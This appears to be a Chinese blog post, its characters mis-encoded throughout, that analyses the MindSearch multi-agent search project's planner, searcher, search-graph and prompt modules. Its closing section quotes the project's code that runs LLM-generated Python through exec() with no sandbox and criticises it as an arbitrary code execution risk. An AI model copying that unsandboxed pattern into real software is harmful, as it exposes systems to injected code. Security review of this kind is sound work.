        <a href="#%e4%b8%bb%e8%a6%81%e5%8a%9f%e8%83%bd-1">ä¸»è¦åŠŸèƒ½</a>
        

        
        </li><li>
        <a href="#%e6%a8%a1%e5%9d%97%e8%a7%a3%e6%9e%90-1">æ¨¡å—è§£æ</a>
        

        
        </li><li>
        <a href="#searcheragent">SearcherAgent</a>
        

        
        </li><li>
        <a href="#websearchgraph%e5%8f%af%e5%b9%b6%e5%8f%91%e7%9a%84%e6%90%9c%e7%b4%a2%e5%9b%be">WebSearchGraphâ€”â€”å¯å¹¶å‘çš„æœç´¢å›¾</a>
        

        
        </li><li>
        <a href="#executionactionplanner-%e7%9a%84%e6%89%a7%e8%a1%8c%e5%99%a8">ExecutionActionâ€”â€”Planner çš„â€œæ‰§è¡Œå™¨â€</a>
        

        
        </li><li>
        <a href="#%e6%b5%81%e7%a8%8b">æµç¨‹</a>
        

        
        </li></ul>
      </li><li>
        <a href="#3-mindsearch-promptmindsearch_promptpy">3. MindSearch Prompt(mindsearch_prompt.py)</a>
        

        
        <ul>
            <li>
        <a href="#planner-%e7%9a%84%e5%b7%a5%e4%bd%9c%e6%b5%81%e7%a8%8bgraph_prompt">Planner çš„å·¥ä½œæµç¨‹ï¼ˆGRAPH_PROMPTï¼‰</a>
        

        
        </li><li>
        <a href="#searcher-%e7%9a%84%e5%b7%a5%e4%bd%9c%e6%b5%81%e7%a8%8bsearcher_system_prompt">Searcher çš„å·¥ä½œæµç¨‹ï¼ˆsearcher_system_promptï¼‰</a>
        

        
        </li><li>
        <a href="#%e6%a8%a1%e6%9d%bf%e5%8f%98%e9%87%8f%e5%a6%82%e4%b8%8b">æ¨¡æ¿å˜é‡å¦‚ä¸‹</a>
        

        
        </li><li>
        <a href="#%e6%b5%81%e7%a8%8b-1">æµç¨‹</a>
        

        
        </li></ul>
      </li></ul>
      </li><li>
        <a href="#%e5%8f%af%e4%bb%a5%e6%94%b9%e8%bf%9b%e7%9a%84%e5%9c%b0%e6%96%b9">å¯ä»¥æ”¹è¿›çš„åœ°æ–¹</a>
        

        
        <ul>
            <ul>
            <li>
        <a href="#1-exec%e7%9a%84%e4%bd%bf%e7%94%a8%e4%bc%9a%e5%b8%a6%e6%9d%a5%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98">1. execçš„ä½¿ç”¨ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜</a>
        

        
        </li><li>
        <a href="#2-%e4%bb%a3%e7%a0%81%e6%8f%90%e5%8f%96%e6%9c%ba%e5%88%b6%e4%b8%8d%e5%a4%9f%e5%ae%89%e5%85%a8">2. ä»£ç æå–æœºåˆ¶ä¸å¤Ÿå®‰å…¨</a>
        

        
        </li><li>
        <a href="#3-%e7%bc%ba%e4%b9%8f%e4%bb%a3%e7%a0%81%e6%b2%99%e7%ae%b1">3. ç¼ºä¹ä»£ç æ²™ç®±</a>
        

        
        </li><li>
        <a href="#4-%e6%bd%9c%e5%9c%a8%e7%9a%84%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb">4. æ½œåœ¨çš„æ³¨å…¥æ”»å‡»</a>
        

        
        </li></ul>
          <li>
        <a href="#%e6%9b%bf%e4%bb%a3%e6%96%b9%e6%a1%88">æ›¿ä»£æ–¹æ¡ˆ</a>
        

        
        </li></ul>
      </li><li>
        <a href="#%e5%85%b6%e4%bb%96">å…¶ä»–</a>
        

        
        <ul>
            <li>
        <a href="#%e5%9b%be%e7%9a%84%e6%a6%82%e5%bf%b5">å›¾çš„æ¦‚å¿µ</a>
        </li></ul>
    </li></ul>
  </details>

    <p>æœ€è¿‘å¼€å§‹æ•´ç† Agent é¡¹ç›®ï¼Œæ‰“ç®—äº†è§£ä¸€ä¸‹é¡¹ç›®èƒŒåçš„æ€è·¯ï¼Œæ‹“å®½ä¸€ä¸‹è§†é‡ã€‚</p>
<p>é¡¹ç›®åœ°å€ï¼šhttps://github.com/InternLM/MindSearch</p>
<p>è¿™ä¸ªé¡¹ç›®çš„æ ¸å¿ƒç†å¿µæ˜¯è®©AIå°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œå¹¶è¡Œæœç´¢è·å–ä¿¡æ¯ï¼Œæœ€åç»¼åˆæ‰€æœ‰ä¿¡æ¯ç»™å‡ºå®Œæ•´ç­”æ¡ˆã€‚</p>
<h1 id="é¡¹ç›®æ¶æ„">é¡¹ç›®æ¶æ„</h1>
<h2 id="1-æ ¸å¿ƒç»„ä»¶ç»“æ„">1. æ ¸å¿ƒç»„ä»¶ç»“æ„</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>MindSearch/
</span></span><span style="display:flex;"><span>â”œâ”€â”€Â mindsearch/Â Â Â Â Â Â Â Â Â Â Â #Â æ ¸å¿ƒAIÂ agentæ¨¡å—
</span></span><span style="display:flex;"><span>â”‚Â Â Â â”œâ”€â”€Â agent/Â Â Â Â Â Â Â Â Â Â Â #Â æ™ºèƒ½ä½“å®ç°
</span></span><span style="display:flex;"><span>â”‚Â Â Â â”œâ”€â”€Â app.pyÂ Â Â Â Â Â Â Â Â Â #Â FastAPIåç«¯æœåŠ¡
</span></span><span style="display:flex;"><span>â”‚Â Â Â â””â”€â”€Â terminal.pyÂ Â Â Â Â #Â å‘½ä»¤è¡Œæ¥å£
</span></span><span style="display:flex;"><span>â”œâ”€â”€Â frontend/Â Â Â Â Â Â Â Â Â Â Â #Â å‰ç«¯ç•Œé¢
</span></span><span style="display:flex;"><span>â”‚Â Â Â â”œâ”€â”€Â React/Â Â Â Â Â Â Â Â Â #Â Reactå‰ç«¯
</span></span><span style="display:flex;"><span>â”‚Â Â Â â”œâ”€â”€Â gradio_agentchatbot/Â Â #Â Gradioç»„ä»¶
</span></span><span style="display:flex;"><span>â”‚Â Â Â â””â”€â”€Â streamlitå‰ç«¯
</span></span><span style="display:flex;"><span>â””â”€â”€Â docker/Â Â Â Â Â Â Â Â Â Â Â Â #Â Dockeréƒ¨ç½²å·¥å…·
</span></span></code></pre></div><h2 id="2-æŠ€æœ¯æ ˆ">2. æŠ€æœ¯æ ˆ</h2>
<ul>
<li>åç«¯ : FastAPI + Python</li>
<li>AIæ¡†æ¶ : Lagent (åŸºäºInternLM)</li>
<li>å‰ç«¯ : React + TypeScript + Vite</li>
<li>UIç»„ä»¶ : Antd + ReactFlow (ç”¨äºå¯è§†åŒ–æœç´¢å›¾)</li>
<li>æœç´¢å¼•æ“ : æ”¯æŒå¤šç§æœç´¢API (Bing, Google, DuckDuckGoç­‰)</li>
</ul>
<h1 id="æ ¸å¿ƒå·¥ä½œåŸç†">æ ¸å¿ƒå·¥ä½œåŸç†</h1>
<h2 id="1-mindsearch-agent-mindsearch_agentpy">1. MindSearch Agent (mindsearch_agent.py)</h2>
<h3 id="ä¸»è¦åŠŸèƒ½">ä¸»è¦åŠŸèƒ½</h3>
<ul>
<li>é—®é¢˜åˆ†è§£ : å°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå¯æœç´¢çš„å­é—®é¢˜</li>
<li>å¹¶è¡Œæœç´¢ : åŒæ—¶æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡</li>
<li>ä¿¡æ¯æ•´åˆ : å°†æœç´¢ç»“æœæ•´ç†æˆâ€œå‚è€ƒèµ„æ–™â€ï¼Œå†è®©å¤§æ¨¡å‹æ ¹æ®è¿™äº›èµ„æ–™ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚</li>
<li>æµå¼è¾“å‡º : å®æ—¶è¿”å›æœç´¢è¿›åº¦å’Œç»“æœ</li>
</ul>
<h3 id="æ¨¡å—è§£æ">æ¨¡å—è§£æ</h3>
<h3 id="å‰ç½®ç±»å‹å’Œå·¥å…·">å‰ç½®ç±»å‹å’Œå·¥å…·</h3>
<ol>
<li>AgentMessage, AgentStatusCode, ModelStatusCode
æ¥è‡ª lagent.schemaï¼Œç”¨æ¥æè¿°â€œå¯¹è¯ä¸­çš„ä¸€æ¡æ¶ˆæ¯â€åŠå…¶â€œçŠ¶æ€ç â€ã€‚</li>
<li>GeneratorWithReturn
æ¥è‡ª lagent.utilsï¼Œæ˜¯ä¸€ä¸ªâ€œæ—¢èƒ½è¿­ä»£åˆèƒ½åœ¨æœ€åæ‹¿è¿”å›å€¼â€çš„ç”Ÿæˆå™¨åŒ…è£…å™¨ã€‚
è¿™é‡Œç”¨æ¥æ‰§è¡Œ self.action.run(&hellip;)ï¼Œæ—¢èƒ½å®æ—¶äº§å‡ºä¸­é—´æ¶ˆæ¯ï¼Œåˆèƒ½åœ¨ç»“æŸæ—¶æ‹¿åˆ°å®Œæ•´çš„å›¾æ•°æ®ã€‚</li>
<li>ExecutionAction, WebSearchGraph
æ¥è‡ªæœ¬åœ°æ¨¡å— .graphã€‚</li>
</ol>
<h3 id="ä¸¤ä¸ªå°å·¥å…·å‡½æ•°">ä¸¤ä¸ªå°å·¥å…·å‡½æ•°</h3>
<ol>
<li>_update_ref(ref, ref2url, ptr)
æŠŠä¸€æ®µæ–‡å­—é‡Œçš„â€œ[[æ•°å­—]]â€å¼•ç”¨æ ‡è®°é‡æ–°ç¼–å·ï¼Œå¹¶åŒæ­¥æ›´æ–° ref2urlã€‚
ä¸¾ä¾‹ï¼š</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>ref  = &#34;æ ¹æ® [[3]] å’Œ [[5]] çš„ç»“è®º...&#34;
</span></span><span style="display:flex;"><span>ptr  = 7
</span></span><span style="display:flex;"><span>è¾“å‡º = &#34;æ ¹æ® [[8]] å’Œ [[9]] çš„ç»“è®º...&#34; ï¼Œ
</span></span><span style="display:flex;"><span>å¹¶æŠŠ ref2url ä¸­ 3ã€5 å¯¹åº”çš„ url æ˜ å°„åˆ° 8ã€9ã€‚
</span></span></code></pre></div><p>è¿”å›å€¼ï¼šæ›´æ–°åçš„æ–‡æœ¬ã€æ›´æ–°åçš„ url æ˜ å°„ã€æœ¬æ¬¡æ–°å¢äº†å¤šå°‘ä¸ªå¼•ç”¨ã€‚</p>
<ol>
<li>_generate_references_from_graph(graph)
æŠŠæœç´¢å›¾é‡Œæ¯ä¸ªèŠ‚ç‚¹ï¼ˆå­é—®é¢˜ï¼‰çš„ç»“æœæ‹¼æˆä¸€æ®µâ€œå‚è€ƒèµ„æ–™â€æ–‡æœ¬å’Œ url æ˜ å°„å­—å…¸ã€‚
æ¯ä¸ªèŠ‚ç‚¹åªå– memory ä¸­ç¬¬ 3 æ¡æ¶ˆæ¯ï¼ˆç´¢å¼•=2ï¼‰çš„å†…å®¹ä½œä¸ºæœç´¢ç»“æœï¼Œå› ä¸ºé‚£é‡Œå›ºå®šæ˜¯ ActionExecutor è¿”å›çš„ json å­—ç¬¦ä¸²ï¼š{ref_id: url}ã€‚</li>
</ol>
<h3 id="ä¸»ç±»mindsearchagent">ä¸»ç±»ï¼šMindSearchAgent</h3>
<ol>
<li>æ„é€ å‡½æ•°</li>
<li>forward(message, session_id=0, **kwargs)
è¿™å°±æ˜¯â€œå…¥å£å‡½æ•°â€ï¼Œè°ƒç”¨æ–¹æ¯å‘ä¸€ä¸ªç”¨æˆ·æ¶ˆæ¯å°±è¿›æ¥ä¸€æ¬¡ã€‚æ•´ä½“æµç¨‹ï¼š</li>
</ol>
<h2 id="2-mindsearch-enginegraphpy">2. MindSearch Engine(graph.py)</h2>
<h3 id="ä¸»è¦åŠŸèƒ½-1">ä¸»è¦åŠŸèƒ½</h3>
<p>è¿™æ®µä»£ç æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼š</p>
<ol>
<li>æŠŠâ€œæœç´¢å­é—®é¢˜â€çœŸæ­£æ‰”åˆ°åå°å»è·‘ï¼ˆWebSearchGraphï¼‰ã€‚</li>
<li>è®© Planner å†™çš„ Python ä»£ç èƒ½è°ƒç”¨è¿™å¼ å›¾ï¼ˆExecutionActionï¼‰ã€‚</li>
</ol>
<h3 id="æ¨¡å—è§£æ-1">æ¨¡å—è§£æ</h3>
<h3 id="searcheragent">SearcherAgent</h3>
<p>ä½œç”¨ï¼šæŠŠå•ä¸ªå­é—®é¢˜åŒ…è£…æˆä¸€æ¡å®Œæ•´ promptï¼Œé€ç»™å¤§æ¨¡å‹ + æœç´¢æ’ä»¶ã€‚</p>
<ul>
<li>åªè´Ÿè´£â€œä¸€ä¸ªé—®é¢˜â€çš„æœç´¢ï¼Œä¸æ‹†é—®é¢˜ï¼Œä¹Ÿä¸å»ºå›¾ã€‚</li>
<li>ä¸ Planner çš„åˆ†å·¥ï¼šPlanner å†³å®šâ€œé—®ä»€ä¹ˆâ€ï¼ŒSearcherAgent è´Ÿè´£â€œæ€ä¹ˆæœâ€ã€‚
æ¨¡æ¿æ‹¼æ¥é€»è¾‘</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>message = user_input_template.format(question=..., topic=...)
</span></span><span style="display:flex;"><span>â†“
</span></span><span style="display:flex;"><span>å¦‚æœ history æœ‰å€¼ï¼Œå†æŠŠå†å² QA ç”¨ user_context_template è´´åˆ°å‰é¢
</span></span><span style="display:flex;"><span>â†“
</span></span><span style="display:flex;"><span>äº¤ç»™çˆ¶ç±» StreamingAgentForInternLM / AsyncStreamingAgentForInternLM è¿›è¡Œæµå¼å¯¹è¯
</span></span></code></pre></div><p>çˆ¶ç±»ï¼ˆStreamingAgentForInternLMï¼‰ä¼šï¼š</p>
<ul>
<li>è°ƒç”¨æœç´¢æ’ä»¶ FastWebBrowser</li>
<li>é€å¥ yield æœç´¢ç»“æœ</li>
<li>ç»“æŸæ—¶æŠŠæ•´æ¡å›ç­”æ”¾è¿› response å­—æ®µï¼ŒæŠŠå¯¹è¯è®°å¿†æ”¾è¿› memory å­—æ®µã€‚</li>
</ul>
<h3 id="websearchgraphå¯å¹¶å‘çš„æœç´¢å›¾">WebSearchGraphâ€”â€”å¯å¹¶å‘çš„æœç´¢å›¾</h3>
<p>æ•°æ®ç»“æ„</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>nodes: dict[str, dict]      # èŠ‚ç‚¹ä¿¡æ¯ï¼ˆå†…å®¹ / ç±»å‹ / å›ç­” / è®°å¿†ï¼‰
</span></span><span style="display:flex;"><span>adjacency_list: dict[str, list[dict]]  # è¾¹ï¼Œå¸¦ state 1/2/3ï¼ˆè¿›è¡Œä¸­/æœªå¼€å§‹/å·²ç»“æŸï¼‰
</span></span><span style="display:flex;"><span>future_to_query: dict[Future, str]     # æ­£åœ¨è·‘çš„åå°ä»»åŠ¡
</span></span><span style="display:flex;"><span>searcher_resp_queue: Queue # ç”Ÿäº§è€…-æ¶ˆè´¹è€…é˜Ÿåˆ—ï¼Œç»™ExecutionAction ç”¨
</span></span><span style="display:flex;"><span>executor: ThreadPoolExecutor           # çº¿ç¨‹æ± ï¼ˆåŒæ­¥æ¨¡å¼ï¼‰
</span></span></code></pre></div><p>ç±»å˜é‡</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>is_async           # æ˜¯å¦å¯ç”¨ asyncio
</span></span><span style="display:flex;"><span>SEARCHER_CONFIG    # SearcherAgent çš„åˆå§‹åŒ–å‚æ•°
</span></span><span style="display:flex;"><span>_SEARCHER_LOOP     # asyncio äº‹ä»¶å¾ªç¯åˆ—è¡¨ï¼ˆasync æ¨¡å¼ï¼‰
</span></span><span style="display:flex;"><span>_SEARCHER_THREAD   # æ¯ä¸ª loop å¯¹åº”çš„åå°çº¿ç¨‹
</span></span></code></pre></div><p>å…³é”®æ–¹æ³•</p>
<ol>
<li>add_root_node
å•çº¯è®°å½•æ ¹èŠ‚ç‚¹ï¼Œæ— æœç´¢ã€‚</li>
<li>add_node(node_name, node_content)</li>
<li>add_edge(start, end)
åŠ è¾¹ï¼Œå¹¶ç«‹å³å¾€é˜Ÿåˆ— put ä¸€æ¡ (start_node, node_info, adjacency_list) ä¾›å‰ç«¯æ›´æ–° UIã€‚</li>
<li>add_response_node
æ ‡è®°ç»“æŸèŠ‚ç‚¹ï¼ŒåŒæ · put ä¸€æ¡æ¶ˆæ¯ã€‚</li>
<li>reset
æ¸…ç©ºå›¾ã€‚</li>
<li>start_loop(n)ï¼ˆç±»æ–¹æ³•ï¼‰
å½“ is_async=True æ—¶ï¼Œæå‰åœ¨åå°å¼€ n ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹è·‘ä¸€ä¸ªç‹¬ç«‹ asyncio loopï¼Œä¾› add_node éšæ—¶æŠ•å¼‚æ­¥ä»»åŠ¡ã€‚</li>
</ol>
<h3 id="executionactionplanner-çš„æ‰§è¡Œå™¨">ExecutionActionâ€”â€”Planner çš„â€œæ‰§è¡Œå™¨â€</h3>
<p>Planner ä¼šç”Ÿæˆä¸€æ®µ Python ä»£ç ï¼Œå½¢å¦‚ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>graph = WebSearchGraph()
</span></span><span style="display:flex;"><span>graph.add_root_node(&#34;å“ªå®¶å¤§æ¨¡å‹APIæœ€ä¾¿å®œï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_node(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;, &#34;ç›®å‰æœ‰å“ªäº›ä¸»è¦çš„å¤§æ¨¡å‹APIæä¾›å•†ï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_node(&#34;OpenAIä»·æ ¼&#34;, &#34;OpenAI çš„ GPT-4 æœ€æ–°ä»·æ ¼æ˜¯å¤šå°‘ï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_edge(&#34;root&#34;,&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;)
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>graph.node(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;)
</span></span></code></pre></div><p>ExecutionAction è´Ÿè´£ï¼š</p>
<ol>
<li>extract_codeï¼š
æŠŠ Planner è¿”å›çš„ markdown é‡Œ python <code> æˆ–</code> ä¸­çš„ä»£ç æŠ å‡ºæ¥ã€‚</li>
<li>execï¼š
åœ¨ä¼ å…¥çš„ global / local å‘½åç©ºé—´é‡Œè·‘è¿™æ®µä»£ç ï¼Œäºæ˜¯ graph å¯¹è±¡å°±åœ¨ local_dict é‡Œç”Ÿæˆäº†ã€‚</li>
<li>æ¶ˆè´¹é˜Ÿåˆ—ï¼š
åªè¦ n_active_tasks &gt; 0ï¼Œå°±ä¸æ–­ä» searcher_resp_queue å–ç»“æœï¼š</li>
<li>å½“æ‰€æœ‰ä»»åŠ¡å®Œæˆåï¼ŒæŠŠä»£ç é‡Œå‡ºç°çš„ graph.node(&hellip;) å¯¹åº”çš„èŠ‚ç‚¹ä¿¡æ¯æ”¶é›†èµ·æ¥ï¼Œè¿”å› (res, graph.nodes, graph.adjacency_list) ç»™ Planner åšä¸‹ä¸€æ­¥å†³ç­–æˆ–ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚</li>
</ol>
<h3 id="æµç¨‹">æµç¨‹</h3>
<ol>
<li>Planner ç”Ÿæˆä»£ç  â†’ graph.add_node(&ldquo;xxx&rdquo;, &ldquo;å­é—®é¢˜&rdquo;)</li>
<li>WebSearchGraph å¯åŠ¨ SearcherAgent</li>
<li>SearcherAgent.forward â†’ çˆ¶ç±» StreamingAgentForInternLM</li>
<li>çˆ¶ç±»è®©å¤§æ¨¡å‹å†™ &lt;|plugin|&gt;{&ldquo;name&rdquo;:&ldquo;FastWebBrowser.search&rdquo;,&hellip;}</li>
<li>çˆ¶ç±»è§£æ JSON â†’ è°ƒç”¨ FastWebBrowser.search â†’ é€å¥ yield æœç´¢ç»“æœ</li>
<li>æœ€ç»ˆç»“æœå†™è¿› node[&ldquo;response&rdquo;] å’Œ node[&ldquo;memory&rdquo;]
WebSearchGraph é€šè¿‡ SearcherAgent æŠŠæ¯ä¸ªå­é—®é¢˜çœŸæ­£æœç´¢å®Œæˆã€‚
ExecutionAction è´Ÿè´£æŠŠå®æ—¶ç»“æœæµå› Plannerã€‚
Planner å†æ ¹æ®ç»“æœå†³å®šç»§ç»­æ‹†é—®é¢˜è¿˜æ˜¯ç›´æ¥æ±‡æ€»ã€‚</li>
</ol>
<h2 id="3-mindsearch-promptmindsearch_promptpy">3. MindSearch Prompt(mindsearch_prompt.py)</h2>
<p>è¿™ä¸ªæ¨¡å—è´Ÿè´£ä¸¤çº§æ€è€ƒé“¾è·¯ï¼š</p>
<ol>
<li>ç¬¬ä¸€çº§ï¼šPlannerï¼ˆç”¨ GRAPH_PROMPTï¼‰
è´Ÿè´£â€œå¦‚ä½•æ‹†é—®é¢˜ â†’ å»ºå›¾ â†’ å†³å®šæœç´¢å“ªäº›å­é—®é¢˜â€ã€‚</li>
<li>ç¬¬äºŒçº§ï¼šSearcherï¼ˆç”¨ searcher_system_promptï¼‰
è´Ÿè´£â€œé’ˆå¯¹ä¸€ä¸ªåŸå­åŒ–çš„å­é—®é¢˜ï¼ŒçœŸæ­£å»æœç´¢ç½‘é¡µï¼Œå¹¶ç»™å‡ºå¸¦å¼•ç”¨çš„ç­”æ¡ˆâ€ã€‚</li>
</ol>
<h3 id="planner-çš„å·¥ä½œæµç¨‹graph_prompt">Planner çš„å·¥ä½œæµç¨‹ï¼ˆGRAPH_PROMPTï¼‰</h3>
<ol>
<li>ç›®æ ‡
æŠŠä¸€ä¸ªå¤æ‚æé—®æ‹†æˆå¯ä»¥å¹¶è¡Œ/ä¸²è¡Œæœç´¢çš„å•çŸ¥è¯†ç‚¹å­é—®é¢˜ï¼Œç”¨ WebSearchGraph æ„é€ æœ‰å‘æ— ç¯å›¾ï¼Œæœ€ç»ˆæ±‡æ€»æˆç­”æ¡ˆã€‚</li>
<li>å…³é”®çº¦æŸ</li>
<li>ç¤ºä¾‹æ‰§è¡Œé¡ºåºï¼ˆå¯¹åº” graph_fewshot_example_cnï¼‰</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>graph = WebSearchGraph()
</span></span><span style="display:flex;"><span>graph.add_root_node(&#34;å“ªå®¶å¤§æ¨¡å‹APIæœ€ä¾¿å®œ?&#34;,&#34;root&#34;)
</span></span><span style="display:flex;"><span>graph.add_node(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;, &#34;ç›®å‰æœ‰å“ªäº›ä¸»è¦çš„å¤§æ¨¡å‹APIæä¾›å•†ï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_node(&#34;OpenAIä»·æ ¼&#34;, &#34;OpenAI çš„ GPT-4 æœ€æ–°ä»·æ ¼æ˜¯å¤šå°‘ï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_node(&#34;Claudeä»·æ ¼&#34;, &#34;Claude 3.5 Sonnet æœ€æ–°ä»·æ ¼æ˜¯å¤šå°‘ï¼Ÿ&#34;)
</span></span><span style="display:flex;"><span>graph.add_edge(&#34;root&#34;,&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;)
</span></span><span style="display:flex;"><span>graph.add_edge(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;,&#34;OpenAIä»·æ ¼&#34;)
</span></span><span style="display:flex;"><span>graph.add_edge(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;,&#34;Claudeä»·æ ¼&#34;)
</span></span><span style="display:flex;"><span>graph.node(&#34;å¤§æ¨¡å‹APIæä¾›å•†&#34;)  # è§¦å‘æœç´¢å¹¶çœ‹åˆ°ç»“æœ
</span></span></code></pre></div><p>LLM æ‹¿åˆ°æœç´¢ç»“æœåï¼Œå†å†³å®šæ˜¯ç»§ç»­æ‹†ï¼Œè¿˜æ˜¯ç›´æ¥ add_response_node æ±‡æ€»ã€‚</p>
<h3 id="searcher-çš„å·¥ä½œæµç¨‹searcher_system_prompt">Searcher çš„å·¥ä½œæµç¨‹ï¼ˆsearcher_system_promptï¼‰</h3>
<ol>
<li>
<p>ç›®æ ‡
é’ˆå¯¹ Planner ç»™å‡ºçš„â€œå½“å‰é—®é¢˜â€ï¼ŒçœŸæ­£è°ƒç”¨æœç´¢å·¥å…·ï¼Œè¿”å›å¸¦ç´¢å¼•å¼•ç”¨çš„ç®€æ´ç­”æ¡ˆï¼Œä»¥ä¾¿ Planner åç»­æ‹¼è£…ã€‚</p>
</li>
<li>
<p>å·¥å…·</p>
</li>
<li>
<p>æ€è€ƒ-è¡ŒåŠ¨æ ¼å¼
æˆ‘çš„æ€è€ƒâ€¦â€¦&lt;|action_start|&gt;&lt;|plugin|&gt;{&ldquo;name&rdquo;:&ldquo;FastWebBrowser.search&rdquo;, &ldquo;parameters&rdquo;:{&hellip;}}&lt;|action_end|&gt;</p>
</li>
<li>
<p>å¼•ç”¨è§„èŒƒ
ç­”æ¡ˆä¸­æ¯å¥å…³é”®ä¿¡æ¯åé¢åŠ  [[idx]]ï¼Œidx ä¸æœç´¢ç»“æœé‡Œçš„ id å¯¹åº”ã€‚
ç¤ºä¾‹ï¼š
æˆªè‡³ 2024-07ï¼ŒOpenAI GPT-4 çš„å®šä»·ä¸º $0.06 / 1k tokens [[0]]ã€‚</p>
</li>
<li>
<p>å†å²é—®é¢˜æ‹¼æ¥
å¦‚æœ Planner ç»™ Searcher çš„ prompt é‡Œè¿˜å¸¦äº†â€œå†å²é—®é¢˜/å›ç­”â€ï¼ŒSearcher ä¼šæŠŠå®ƒä»¬æ”¾åœ¨æŸä¸ªåŒºå—é‡Œï¼Œæ–¹ä¾¿åœ¨å…ˆå‰åŸºç¡€ä¸Šè¿½é—®ï¼Œé¿å…é‡å¤æœç´¢ã€‚</p>
</li>
</ol>
<h3 id="æ¨¡æ¿å˜é‡å¦‚ä¸‹">æ¨¡æ¿å˜é‡å¦‚ä¸‹</h3>
<h3 id="æµç¨‹-1">æµç¨‹</h3>
<ol>
<li>Planner æ”¶åˆ°ç”¨æˆ·é—®é¢˜ â†’ æ‹†æˆ sub_questions â†’ è°ƒç”¨ graph.add_node è§¦å‘æœç´¢ã€‚</li>
<li>Searcher æ”¶åˆ° sub_question â†’ è°ƒç”¨æµè§ˆå™¨ â†’ è¿”å›å¸¦å¼•ç”¨çš„ answerã€‚</li>
<li>Planner æŠŠ answer å¡«å›å›¾ â†’ åˆ¤æ–­æ˜¯å¦ç»§ç»­æ‹† or ç›´æ¥ add_response_nodeã€‚</li>
<li>æœ€ç»ˆ Planner è°ƒç”¨ add_response_nodeï¼ŒæŠŠæ•´å›¾æ‰€æœ‰é—®ç­”å¯¹æ‹¼ç»™å¤§æ¨¡å‹ï¼Œç”¨ FINAL_RESPONSE_CN/EN æ¨¡æ¿ç”Ÿæˆâ€œæœ€ç»ˆå®Œæ•´ç­”æ¡ˆâ€ã€‚</li>
</ol>
<h1 id="å¯ä»¥æ”¹è¿›çš„åœ°æ–¹">å¯ä»¥æ”¹è¿›çš„åœ°æ–¹</h1>
<h3 id="1-execçš„ä½¿ç”¨ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜">1. execçš„ä½¿ç”¨ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜</h3>
<p>åœ¨&quot;graph.py&quot; ä¸­çš„ä»£ç æœ‰å¦‚ä¸‹ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>def run(self, command, local_dict, global_dict, stream_graph=False):
</span></span><span style="display:flex;"><span>    def extract_code(text: str) -&gt; str:
</span></span><span style="display:flex;"><span>        text = re.sub(r&#34;from ([\w.]+) import WebSearchGraph&#34;, &#34;&#34;, text)
</span></span><span style="display:flex;"><span>        # ... existing code ...
</span></span><span style="display:flex;"><span>        return text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    command = extract_code(command)
</span></span><span style="display:flex;"><span>    exec(command, global_dict, local_dict)  # ğŸš¨ ç›´æ¥æ‰§è¡Œä»»æ„ä»£ç 
</span></span></code></pre></div><p>é—®é¢˜åˆ†æï¼š</p>
<ul>
<li>ä»»æ„ä»£ç æ‰§è¡Œ: ç›´æ¥æ‰§è¡Œä»LLMç”Ÿæˆçš„Pythonä»£ç ï¼Œæ²¡æœ‰ä»»ä½•å®‰å…¨é™åˆ¶</li>
<li>å…¨å±€å‘½åç©ºé—´æ±¡æŸ“: ä½¿ç”¨globals()ä½œä¸ºæ‰§è¡Œç¯å¢ƒï¼Œå¯èƒ½å½±å“æ•´ä¸ªç¨‹åºçŠ¶æ€</li>
